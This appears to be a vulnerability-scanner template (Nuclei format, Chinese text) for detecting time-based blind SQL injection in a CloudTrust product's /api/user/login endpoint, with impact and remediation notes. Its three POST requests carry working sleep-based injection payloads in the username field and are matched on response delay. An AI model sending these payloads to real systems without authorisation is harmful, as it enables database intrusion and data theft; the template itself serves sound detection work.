id: cloudtrust-sql-bind
info:
  name: CloudTrust 登录接口 - 时间盲注漏洞
  author: 小r
  severity: high
  description: |
    该模板用于检测 CloudTrust 登录接口 - 时间盲注漏洞。该类漏洞通常源于接口将用户输入拼接到 SQL 语句中，导致攻击者可改变查询语义。模板主要向 `/api/user/login` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://www.cloudtrust.com.cn/product/jingyun.html
  metadata:
    verified: true
    max-request: 3
    vendor: cloudtrust
    product: cloudtrust
  tags: sqli,vuln,cloudtrust
flow: http(1) && http(2) && http(3)
http:
  - method: POST
    path:
      - '{{BaseURL}}/api/user/login'
    redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(7))a)='
    matchers:
      - type: dsl
        dsl:
          - 'duration * 1000 >= 7000 && duration * 1000 <= 10000'
  - method: POST
    path:
      - '{{BaseURL}}/api/user/login'
    redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(1))a)='
    matchers:
      - type: dsl
        dsl:
          - 'duration * 1000 >= 1000 && duration * 1000 <= 4000'
  - method: POST
    path:
      - '{{BaseURL}}/api/user/login'
    redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(4))a)='
    matchers:
      - type: dsl
        dsl:
          - 'duration * 1000 >= 4000 && duration * 1000 <= 7000'
